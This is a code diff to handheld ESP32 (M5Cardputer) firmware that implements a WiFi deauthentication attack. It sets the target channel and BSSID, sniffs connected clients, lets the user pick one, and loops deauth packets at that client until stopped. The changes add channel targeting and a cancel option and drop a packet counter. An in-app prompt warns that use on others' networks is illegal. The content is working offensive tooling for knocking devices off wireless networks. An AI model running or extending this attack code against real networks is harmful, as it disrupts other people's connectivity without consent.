@@ -678,6 +678,7 @@ void runApp(uint8_t appID){
       bool answwear = drawQuestionBox("WARNING!", "This is illegal to use not", "on your network! Continue?");
       if (answwear){
         if(!wifiChoice.equals("")){
+          set_target_channel(WiFi.SSID(intWifiChoice).c_str());
           setMac(WiFi.BSSID(intWifiChoice));
           Serial.println("User inited deauth");
           initClientSniffing();
@@ -694,12 +695,14 @@ void runApp(uint8_t appID){
             }
           }
           uint8_t target = drawMultiChoice("Select target.", clients, clientLen, 0, 0);
+          if(target==100){
+            return;
+          }
           Serial.println("Selected target: " + clients[target]);
           esp_wifi_set_promiscuous(false);
-          int PPS;
           delay(100);
           while(true){
-            drawInfoBox("Deauth!", "Deauth active on target:", String(clients[target]) + "PPS: " + String(PPS), false, false);
+            drawInfoBox("Deauth!", "Deauth active on target:", String(clients[target]) + ".", false, false);
             updateM5();
             Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
             if(status.enter){
@@ -707,7 +710,6 @@ void runApp(uint8_t appID){
               break;
             }
             send_deauth_packets(clients[target], 1);
-            PPS++;
           }
           
           clearClients();
